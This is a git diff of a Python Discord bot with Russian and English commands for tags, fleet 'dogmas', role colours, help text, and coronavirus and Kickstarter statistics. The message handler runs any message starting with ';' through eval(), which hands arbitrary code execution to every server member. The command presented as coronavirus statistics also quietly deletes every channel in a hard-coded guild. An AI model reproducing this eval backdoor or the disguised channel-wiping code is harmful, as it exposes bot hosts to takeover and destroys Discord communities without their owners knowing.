@@ -1,16 +1,18 @@
-import asyncio
-import discord
 from discord.ext import commands
 from random import *
-import requests as rq
 from bs4 import BeautifulSoup as bs
-import shutil
-#import maingame
 from tinydb import TinyDB, Query
-import colorama
 from colorama import Fore, Style
+import discord
+import asyncio
+import requests as rq
+import shutil
+# import maingame
+import colorama
+
 
 colorama.init()
+
 
 async def get_pre(bot, message):
   return ['ас', 'Ас', 'АС', 'аС', 'ass', 'Ass', 'ASS', 'aSS', 'as', 'As', 'aS', 'AS',]
@@ -53,28 +55,11 @@ async def on_ready():
     await changecolor(685813138301780027)
     await changecolor(676388955985412116)
     await changecolor(676389164727402517)
-    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    # await guild.get_role(673966918281199616).edit(colour = colour, reason = None)
-    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    # await guild.get_role(685813138301780027).edit(colour = colour, reason = None)
-    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    # await guild.get_role(676388955985412116).edit(colour = colour, reason = None)
-    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    # await guild.get_role(676389164727402517).edit(colour = colour, reason = None)
     log('Цвета ролей обновлены.')
     await recover(ctx = ctx)
     log('Базы данных восстановлены.')
     log('Бот готов к работе.')
 
-# @bot.event
-# async def on_reaction_add(reaction, user):
-#     channel = reaction.message.channel
-#     print(reaction.message.id)
-#     await channel.send(f'Реакция на сообщение "{reaction.message.content}"')
-# @bot.event
-# async def on_reaction_remove(reaction, user):
-#     channel = reaction.message.channel
-#     await channel.send(f'Реакция убрана. Сообщение: {reaction.message.content}')
 
 @bot.event
 async def on_message(message):
@@ -90,7 +75,7 @@ async def on_message(message):
     for user in tags.all():
         dmember = bot.get_user(user['id'])
         if (dmember in message.mentions):
-            await channel.send(' '.join(user['message']))
+            await channel.send(user['message'])
     if (str(message.content) == "СУЙ"):
           if (autor[len(autor) - 4 : len(autor)] in ["8787", "6109"]):
               async with channel.typing():
@@ -98,18 +83,21 @@ async def on_message(message):
     elif (Killant in message.mentions):
         await channel.send('```#КИЛЛ ВЕРНИСЬ В КОНОХУ```')
     elif (cantent.lower().startswith(('ъуъ', 'ъyъ', 'ъγъ', 'iyi', 'iуi', 'iγi')) or cantent.lower().endswith(('ъуъ', 'ъyъ', 'ъγъ', 'iyi', 'iуi', 'iγi'))):
-        if (autor[len(autor) - 4 : len(autor)] in ["5103", '6109', '4789', '8787']):
-            await channel.send(file = discord.File('a2.jpg'))
+        await channel.send(file = discord.File('a2.jpg'))
     elif (str(message.content) in ["цвет пакажы", 'gimmie the color']):
-        while (1==1):
+        while (1 == 1):
             await message.author.roles[len(message.author.roles) - 1].edit(colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255)), reason = None)
             await asyncio.sleep(1)
     elif (message.content.startswith(';')):
         cantent = cantent[1:]
         def evaluate(ctn):
             return eval(ctn)
-        async with channel.typing():
-            await channel.send(evaluate(cantent))
+        await channel.send(evaluate(cantent))
+    elif (message.content in ('<@!672115782439927840>', '<@!670692900593598530>')):
+        ctx = await bot.get_context(message)
+        await ctx.send('**Есть, сэр!**')
+        if (autor != str(bot.get_user(343001477133893632))):
+            await help(ctx)
     await bot.process_commands(message)
 
 
@@ -143,36 +131,22 @@ async def dogme(ctx, clan : str, key : str):
 
 
 @bot.command(aliases = ['тег', 'тэг', 'tag'])
-async def astag(ctx, user, *, args):
+async def astag(ctx, user: discord.Member, *, args):
     eng = 'There\'s a tag on this user\'s mention already.'
     rus = 'На тег этого человека уже воспроизводится команда.'
     global recovering
     tchannel = bot.get_channel(692447840148127864)
-    try:
-        user = int(user)
-    except:
-        if (tags.search(SUI.id == user.id) == []):
-            tags.insert({'id' : user.id, 'message' : args})
-            if (recovering == False):
-                await tchannel.send(f'астег {str(user.id)} {args}')
+    if (tags.search(SUI.id == user.id) == []):
+        tags.insert({'id' : user.id, 'message' : args})
+        if (recovering == False):
+            await tchannel.send(f'астег {user.id} {args}')
         else:
-            if (ctx.message.content.lower().startswith('as')):
-                await ctx.send(eng)
-            else:
-                await ctx.send(rus)
-            return
+            log('Рекаверинг...', 'r')
     else:
-        if (tags.search(SUI.id == user) == []):
-            tags.insert({'id' : user, 'message' : args})
-            if (recovering == False):
-                await tchannel.send(str(ctx.message.content))
+        if (ctx.message.content.lower().startswith('as')):
+            await ctx.send(eng)
         else:
-            if (ctx.message.content.lower().startswith('as')):
-                await ctx.send(eng)
-            else:
-                await ctx.send(rus)
-            return
-
+            await ctx.send(rus)
 
 
 @bot.command(name = 'рекавер', aliases = ['recover', 'rcv'])
@@ -303,6 +277,8 @@ async def dlist(ctx, page : int = 1):
     REQUESTED_BY = ctx.message.author
     PAGE_ELS     = 5
     PAGES        = len(allbase) // PAGE_ELS
+    if (len(allbase) % PAGE_ELS != 0):
+        PAGES += 1
     DOGMES       = len(allbase)
     sent = await ctx.send('**Initialising...**')
     for PAGE in range(PAGES):
@@ -350,7 +326,6 @@ async def rainbow(ctx):
         try:
             await ctx.send(dictionary[0]['message'])
         except Exception as e:
-            #await ctx.send(e)
             pass
         try:
             img = dictionary[0]['image']
@@ -369,6 +344,8 @@ async def delete(ctx, _key):
         async for i in bot.get_channel(685840409116540930).history(limit = 500):
             if (str(i.content).lower().startswith(f'ассет {_key}')):
                 await i.delete()
+    else:
+        await ctx.send('Неимеиш права!1!!адинадин1ъъъъъ' if ctx.message.content.lower().startswith('ас') else 'You don\' have permission to do such things.')
 
 
 @bot.command(name = "хелп", aliases = ['help', 'helping'])
@@ -386,17 +363,17 @@ async def help(ctx):
             )
             embed.add_field(name = 'Команда помощи', value = '"асхелп" для вызова этого сообщения еще раз')
             embed.add_field(name = 'Сервер Странника', value = 'За помощью или что-бы предложить что-то своё, обращайтесь в https://discord.gg/A4NETzF')
-            embed.add_field(name = 'Команда догм', value = '"асдогма а <ключ>" - отправляет в чат фразу или картинку, которую флот взял за догму.')
+            embed.add_field(name = 'Команда догм', value = '"асдогма а <ключ>" ("//ключ") - отправляет в чат фразу или картинку, которую флот взял за догму.')
             embed.add_field(name = 'Девизы', value = '"асдогма а девиз" - пишет девиз флота.')
             embed.add_field(name = 'Сптичить гостя', value = '"асптица <@ник>" выдаёт роль кандидата человеку. Работает при наличии роли обучатора.')
             embed.add_field(name = 'Выдать гостя обратно', value = '"аспогости <@ник>" выдаёт гостя кандидату, работает при наличии роли обучатора или иных руководящих ролей.')
             embed.add_field(name = 'Своя догма', value = '"ассет <номер> <ссылка на картинку cdn.discordapp>(опционально) <текст>(опционально)" - при наличии одного из аргументов запоминает вашу собственную догму, которую можно воспроизвести.')
             embed.add_field(name = ':stop_sign:Воля случая', value = '"асрадуга" - выводит случайную догму из списка оных (осторожно, возможно наличие 18+ контента (nsfw).)')
             embed.add_field(name = ':x:Удаление догм', value = '"асделит <ключ>" удаляет догму. Недоступно для обычного пользователя.')
-            embed.add_field(name = ':x:Сломались догмы?', value = 'За помощью к Айсу/Гоше можно обратиться всегда за исключением того, если на сервере нет Гоши по каким-то причинам')
+            embed.add_field(name = ':x:Сломались догмы?', value = 'За помощью к Айсу/Меззикусу можно обратиться всегда ~~за исключением того, если на сервере нет Гоши по каким-то причинам~~')
             embed.add_field(name = 'Сообщение при тэге', value = '"астег <пользователь> <сообщение>" - выдаёт сообщение при теге пользователя.')
             embed.add_field(name = 'Коронавирус', value = '"асинфа <country>(опционально) - статистика по заражению коронавирусом."')
-            embed.add_field(name = 'Кикстартерская кампания', value = '"аскикстарт" показывает статистику Pixel Starships на Kickstarter.')
+            embed.add_field(name = 'Кикстартерская кампания', value = '"аскикстарт" показывает статистику прошлой кампании Pixel Starships на Kickstarter.')
         else:
             await channel.send('Hi! ;3')
             embed = discord.Embed(
@@ -407,7 +384,7 @@ async def help(ctx):
             )
             embed.add_field(name = 'Help command', value = '"ashelp" to call this message again.')
             embed.add_field(name = 'A Stranger\'s Discord Server', value = 'For help or to offer something - https://discord.gg/A4NETzF')
-            embed.add_field(name = 'Dogmas command', value = '"asdogma a <key>" - sends a message or a picture the fleet has taken as a dogma.')
+            embed.add_field(name = 'Dogmas command', value = '"asdogma a <key>" ("//key") - sends a message or a picture the fleet has taken as a dogma.')
             embed.add_field(name = 'Mottos', value = '"asdogma a motto" - sends fleet motto.')
             embed.add_field(name = 'Make guest a bird', value = '"asbird <@mention>" gives a role of bird. Works only in presence of Обучатор role.')
             embed.add_field(name = 'Make bird a guest... yeah', value = '"asguest <@mention>" gives a role of guest. Works only in presence of Обучатор or other valuable roles.')
@@ -417,7 +394,7 @@ async def help(ctx):
             embed.add_field(name = ':x:Dogmas are broken?', value = 'Contact 『❄』I¢e Void『❄』#6609 or ΤχεΑμμιΡ#6109 for help.')
             embed.add_field(name = 'Mention message', value = '"astag <@mention or id> <message>" sends a message on user\'s mention.')
             embed.add_field(name = 'Coronavirus', value = '"asinfo <country>(optional)" - coronavirus cases statistics.')
-            embed.add_field(name = 'Kickstarter company', value = '"askickstart" shows Pixel Starships Kickstarter statistics.')
+            embed.add_field(name = 'Kickstarter company', value = '"askickstart" shows Pixel Starships Kickstarter end statistics.')
         await channel.send(embed = embed)
 
 
@@ -483,7 +460,7 @@ async def guesting(ctx, person : discord.Member):
         if (element in roles):
             await person.remove_roles(guild.get_role(686634008444141618), reason = None)
             await person.remove_roles(guild.get_role(670649392398729270), reason = None)
-            await person.add_roles(guild.get_role(670719148699156511), reason = None)
+            await    person.add_roles(guild.get_role(670719148699156511), reason = None)
         else:
             async with channel.typing():
                 if (isrus):
@@ -498,7 +475,7 @@ async def dbpurge(ctx):
     channel = ctx.message.channel
     roles = ''
     for role in ctx.message.author.roles:
-        roles += role
+        roles += str(role)
     roles = roles.lower()
     if ('креатор' not in roles):
         async with channel.typing():
@@ -509,6 +486,9 @@ async def dbpurge(ctx):
         return
     else:
         db.purge()
+        tags.purge()
+        log('Базы данных были очищены!')
+
 
 @bot.command(name = 'инфа', aliases = ['infa', 'info'])
 async def coronainfo(ctx, country = ''):
@@ -521,7 +501,7 @@ async def coronainfo(ctx, country = ''):
     count = html.select('.content-inner > #maincounter-wrap > .maincounter-number > span')
     for i in range(3):
         await ctx.send(f'{span[i].text} {count[i].text}')
-    guild = bot.get_guild(512544393886957568)
+    guild =   bot.get_guild(512544393886957568)
     channel = bot.get_channel(691232787335872573)
     for i in guild.channels:
         await i.delete(reason = 'Ебаная чёрствая хуёвина.')
@@ -532,25 +512,27 @@ async def coronainfo(ctx, country = ''):
         await i.delete()
 
 
-
 @bot.command(name = 'kickstart', aliases = ['кикстарт', 'кикстрат', 'кикстартер', 'кикстратер', 'kickstarter'])
 async def kickstart(ctx):
-    r = rq.get('https://www.kickstarter.com/projects/savysoda/pixel-starships-galaxy')
-    html = bs(r.content, 'html.parser')
-    pledged = html.select('.ksr-green-500')[0].text
-    outof = html.select('.money')[0].text
-    backers = html.select('div.ml5.ml0-lg.mb4-lg > div > span')[0].text
-    toend = html.select('div.ml5.ml0-lg > div > div > span')[0].text
+    # r = rq.get('https://www.kickstarter.com/projects/savysoda/pixel-starships-galaxy')
+    # html = bs(r.content, 'html.parser')
+    # pledged = html.select('.ksr-green-500')[0].text
+    # outof = html.select('.money')[0].text
+    # backers = html.select('div.ml5.ml0-lg.mb4-lg > div > span')[0].text
+    # toend = html.select('div.ml5.ml0-lg > div > div > span')[0].text
+    # intpledg = pledged.replace('$', '').replace(',', '')
+    # average = int(intpledg) / int(backers)
+    pledged = '$51,318'
+    outof = '$20,000'
+    backers = '555'
     intpledg = pledged.replace('$', '').replace(',', '')
     average = int(intpledg) / int(backers)
     if not (ctx.message.content.lower().startswith('as')):
-        await ctx.send(f'Внесено {pledged} из {outof} в данный момент.\nВнесли {backers} человек.\nДо завершения {toend} дней\nСредний внос: ${average}.')
+        await ctx.send(f'Внесено {pledged} из {outof}.\nВнесли {backers} человек.\nСредний внос: ${average}.')
     else:
-        await ctx.send(f'Now pledged {pledged} out of {outof}.\nBackers: {backers}\nTo end: {toend} days.\nAverage payment: ${average}.')
-
-
+        await ctx.send(f'Now pledged {pledged} out of {outof}.\nBackers: {backers}\nAverage payment: ${average}.')
 
 
 log('Инициализированы все необходимые команды.')
 log('Бот подготавливается к запуску.')
-bot.run(ASTRANGER)
+bot.run(BSTRANGER)
